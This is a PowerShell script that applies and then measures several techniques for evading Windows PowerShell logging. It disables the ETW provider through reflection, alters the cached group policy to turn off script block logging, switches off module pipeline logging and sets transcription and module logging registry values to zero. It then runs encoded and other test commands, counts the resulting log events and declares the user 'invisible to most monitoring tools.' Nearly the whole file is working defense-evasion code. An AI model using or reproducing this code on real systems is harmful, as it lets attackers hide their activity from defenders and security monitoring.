function Apply-AllEvasionTechniques {
    Write-Host "Applying ALL ETW Evasion Techniques..." -ForegroundColor Cyan
    Write-Host "=======================================" -ForegroundColor Cyan
    
    $results = @()  # Array for table data
    
    # Technique 1: PowerShell Reflection
    try {
        Write-Host "1. Applying PowerShell Reflection..." -ForegroundColor Yellow
        $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
        [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0)
        $results += [PSCustomObject]@{Technique="Reflection"; Status="SUCCESS"; Details="ETW Provider disabled"}
        Write-Host "   SUCCESS" -ForegroundColor Green
    } catch {
        $results += [PSCustomObject]@{Technique="Reflection"; Status="FAILED"; Details=$_.Exception.Message}
        Write-Host "   FAILED: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Technique 2: GPO Cache Modification
    try {
        Write-Host "2. Applying GPO Cache Modification..." -ForegroundColor Yellow
        $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
        $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
        
        $sbKey = "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
        $sbDict = [Collections.Generic.Dictionary[String,Object]]::new()
        $sbDict.Add("EnableScriptBlockLogging", "0")
        $sbDict.Add("EnableScriptBlockInvocationLogging", "0")
        $GroupPolicySettings[$sbKey] = $sbDict
        Import-Module Microsoft.PowerShell.Utility -Force
        
        $results += [PSCustomObject]@{Technique="GPO"; Status="SUCCESS"; Details="Cache tampered for ScriptBlock/Invocation"}
        Write-Host "   SUCCESS" -ForegroundColor Green
    } catch {
        $results += [PSCustomObject]@{Technique="GPO"; Status="FAILED"; Details=$_.Exception.Message}
        Write-Host "   FAILED: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Technique 3: Module Pipeline Abuse
    try {
        Write-Host "3. Applying Module Pipeline Abuse..." -ForegroundColor Yellow
        $modules = Get-Module
        $disabledCount = 0
        foreach ($module in $modules) {
            try { 
                $module.LogPipelineExecutionDetails = $false 
                $disabledCount++
            } catch {}
        }
        
        $snapins = Get-PSSnapin
        foreach ($snapin in $snapins) {
            try { $snapin.LogPipelineExecutionDetails = $false } catch {}
        }
        
        $results += [PSCustomObject]@{Technique="Pipeline"; Status="SUCCESS"; Details="$disabledCount modules disabled"}
        Write-Host "   SUCCESS ($disabledCount modules disabled)" -ForegroundColor Green
    } catch {
        $results += [PSCustomObject]@{Technique="Pipeline"; Status="FAILED"; Details=$_.Exception.Message}
        Write-Host "   FAILED: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Technique 4: Additional PowerShell Settings
    try {
        Write-Host "4. Applying Additional PowerShell Settings..." -ForegroundColor Yellow
        
        # Disable PowerShell transcription if enabled
        if (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription") {
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0 -ErrorAction SilentlyContinue
        }
        
        # Disable module logging if registry key exists
        if (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging") {
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -ErrorAction SilentlyContinue
        }
        
        $results += [PSCustomObject]@{Technique="Additional"; Status="SUCCESS"; Details="Transcription & Module registry disabled"}
        Write-Host "   SUCCESS" -ForegroundColor Green
    } catch {
        $results += [PSCustomObject]@{Technique="Additional"; Status="FAILED"; Details=$_.Exception.Message}
        Write-Host "   FAILED: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
    Write-Host "EVASION SUMMARY:" -ForegroundColor Cyan
    Write-Host "$("=" * 50)" -ForegroundColor Cyan
    
    # Print table header
    Write-Host ("{0,-15} {1,-10} {2}" -f "Technique", "Status", "Details") -ForegroundColor Cyan
    Write-Host ("{0,-15} {1,-10} {2}" -f "---------", "------", "-------") -ForegroundColor Gray
    
    # Sort by status (SUCCESS first)
    $sortedResults = $results | Sort-Object { $_.Status -eq "FAILED" }
    
    foreach ($result in $sortedResults) {
        $detailsShort = if ($result.Details.Length -gt 25) { $result.Details.Substring(0,25) + "..." } else { $result.Details }
        $color = if ($result.Status -eq "SUCCESS") { "Green" } else { "Red" }
        Write-Host ("{0,-15} {1,-10} {2}" -f $result.Technique, $result.Status, $detailsShort) -ForegroundColor $color
    }
    
    Write-Host "$("=" * 50)" -ForegroundColor Cyan
    $successCount = ($results | Where-Object { $_.Status -eq "SUCCESS" }).Count
    Write-Host "Techniques applied successfully: $successCount / $($results.Count)" -ForegroundColor Green
    
    return $results
}

function Test-CombinedEvasion {
    Write-Host ""
    Write-Host "Testing Combined Evasion Effectiveness..." -ForegroundColor Cyan
    Write-Host "=========================================" -ForegroundColor Cyan
    
    # Count events before test
    $before_4104 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} -ErrorAction SilentlyContinue | Measure-Object).Count
    $before_4103 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4103} -ErrorAction SilentlyContinue | Measure-Object).Count
    $before_sysmon = (Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} -MaxEvents 50 -ErrorAction SilentlyContinue | Measure-Object).Count
    
    Write-Host "BEFORE TEST:" -ForegroundColor Gray
    Write-Host ("{0,-30} {1}" -f "PowerShell 4104 events:", $before_4104) -ForegroundColor Gray
    Write-Host ("{0,-30} {1}" -f "PowerShell 4103 events:", $before_4103) -ForegroundColor Gray
    Write-Host ("{0,-30} {1}" -f "Sysmon process events:", $before_sysmon) -ForegroundColor Gray
    
    # Execute comprehensive test
    Write-Host ""
    Write-Host "Executing comprehensive test commands..." -ForegroundColor Yellow
    
    # Basic commands
    whoami | Out-Null
    Get-Process | Select-Object -First 5 | Out-Null
    Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object -First 3 | Out-Null
    
    # Suspicious commands
    Write-Host "Executing potentially suspicious commands..." -ForegroundColor Yellow
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Get-ComputerInfo | Select-Object WindowsProductName"))
    powershell -enc $encoded | Out-Null
    
    # Advanced PowerShell
    Get-WmiObject -Class Win32_ComputerSystem | Select-Object Name, Manufacturer | Out-Null
    
    # File operations
    New-Item -Path "C:\temp\evasion-test.txt" -ItemType File -Value "Test content" -Force | Out-Null
    Get-Content "C:\temp\evasion-test.txt" | Out-Null
    Remove-Item "C:\temp\evasion-test.txt" -Force | Out-Null
    
    # Registry operations  
    New-Item -Path "HKCU:\Software\TestEvasion" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\TestEvasion" -Name "TestValue" -Value "EvasionTest" | Out-Null
    Remove-Item -Path "HKCU:\Software\TestEvasion" -Force | Out-Null
    
    # Network operations
    try {
        Test-NetConnection -ComputerName "8.8.8.8" -Port 53 -WarningAction SilentlyContinue | Out-Null
    } catch {}
    
    # Wait for logs to settle
    Write-Host "Waiting for logs to settle..." -ForegroundColor Gray
    Start-Sleep 5
    
    # Count events after test
    $after_4104 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} -ErrorAction SilentlyContinue | Measure-Object).Count
    $after_4103 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4103} -ErrorAction SilentlyContinue | Measure-Object).Count
    $after_sysmon = (Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} -MaxEvents 50 -ErrorAction SilentlyContinue | Measure-Object).Count
    
    Write-Host ""
    Write-Host "AFTER TEST:" -ForegroundColor Gray
    Write-Host ("{0,-30} {1}" -f "PowerShell 4104 events:", $after_4104) -ForegroundColor Gray
    Write-Host ("{0,-30} {1}" -f "PowerShell 4103 events:", $after_4103) -ForegroundColor Gray
    Write-Host ("{0,-30} {1}" -f "Sysmon process events:", $after_sysmon) -ForegroundColor Gray
    
    # Calculate differences
    $diff_4104 = $after_4104 - $before_4104
    $diff_4103 = $after_4103 - $before_4103
    $diff_sysmon = $after_sysmon - $before_sysmon
    $total_ps_diff = $diff_4104 + $diff_4103
    
    Write-Host ""
    Write-Host "NEW EVENTS GENERATED:" -ForegroundColor Gray
    Write-Host ("{0,-30} {1}" -f "PowerShell 4104:", $diff_4104) -ForegroundColor Gray
    Write-Host ("{0,-30} {1}" -f "PowerShell 4103:", $diff_4103) -ForegroundColor Gray
    Write-Host ("{0,-30} {1}" -f "Total PowerShell:", $total_ps_diff) -ForegroundColor Gray
    Write-Host ("{0,-30} {1}" -f "Sysmon Process:", $diff_sysmon) -ForegroundColor Gray
    Write-Host "(expected - this should still log)" -ForegroundColor Gray
    
    # Effectiveness calculation
    $expected_ps_events = 15  # Rough estimate without evasion
    if ($total_ps_diff -eq 0) {
        $effectiveness = 100
        $status = "EXCELLENT"
        $color = "Green"
    } elseif ($total_ps_diff -le 3) {
        $effectiveness = [math]::Round(((($expected_ps_events - $total_ps_diff) / $expected_ps_events) * 100), 2)
        $status = "GOOD"  
        $color = "Yellow"
    } else {
        $effectiveness = [math]::Round(((($expected_ps_events - $total_ps_diff) / $expected_ps_events) * 100), 2)
        $status = "NEEDS IMPROVEMENT"
        $color = "Red"
    }
    
    Write-Host ""
    Write-Host "EVASION EFFECTIVENESS: $effectiveness% - $status" -ForegroundColor $color
    
    if ($diff_sysmon -gt 0) {
        Write-Host "NOTE: Sysmon still detecting processes (this is expected)" -ForegroundColor Yellow
        Write-Host "      Focus should be on eliminating PowerShell events only"
    }
    
    return @{
        'PowerShellEventsBlocked' = $total_ps_diff -eq 0
        'Effectiveness' = $effectiveness
        'Status' = $status
        'Color' = $color  # Tambah color buat final summary
        'Details' = @{
            '4104_diff' = $diff_4104
            '4103_diff' = $diff_4103  
            'sysmon_diff' = $diff_sysmon
        }
    }
}

# Main execution
Write-Host "ULTIMATE ETW EVASION TESTING" -ForegroundColor Cyan
Write-Host "=============================" -ForegroundColor Cyan

$evasionResults = Apply-AllEvasionTechniques
$testResults = Test-CombinedEvasion

Write-Host ""
Write-Host "FINAL SUMMARY:" -ForegroundColor Cyan
Write-Host "===============" -ForegroundColor Cyan
Write-Host ("{0,-30} {1}" -f "Evasion techniques applied:", $evasionResults.Count) -ForegroundColor Gray
Write-Host ("{0,-30} {1}" -f "PowerShell logging blocked:", $testResults.PowerShellEventsBlocked) -ForegroundColor Gray
Write-Host ("{0,-30} {1}%" -f "Overall effectiveness:", $testResults.Effectiveness) -ForegroundColor Gray
Write-Host ("{0,-30} {1}" -f "Status:", $testResults.Status) -ForegroundColor $testResults.Color  # Fix: Pake Color dari return

if ($testResults.PowerShellEventsBlocked) {
    Write-Host ""
    Write-Host "SUCCESS: PowerShell logging has been completely evaded!" -ForegroundColor Green
    Write-Host "Your PowerShell activities should now be invisible to most monitoring tools."
} else {
    Write-Host ""
    Write-Host "PARTIAL SUCCESS: Some PowerShell events are still being logged." -ForegroundColor Yellow
    Write-Host "Consider additional evasion techniques or check for advanced monitoring."
}